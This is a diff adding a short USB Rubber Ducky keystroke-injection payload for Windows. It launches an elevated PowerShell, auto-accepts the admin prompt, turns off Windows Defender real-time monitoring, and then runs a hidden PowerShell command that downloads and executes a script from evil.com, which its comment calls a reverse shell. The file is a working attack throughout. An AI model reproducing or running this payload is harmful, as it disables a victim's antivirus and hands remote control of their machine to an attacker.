@@ -1,0 +1,18 @@
+REM Run powershell as administrator process to turn off Windows Defender, and then download and call reverse powershell script
+DELAY 1000
+GUI r
+DELAY 200
+REM my best attempt at a elevated powershell instance
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2600
+ALT y
+DELAY 500
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 1000
+STRING powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://www.evil.com/file.ps1'))"
+ENTER
+DELAY 1000
+STRING exit
+ENTER
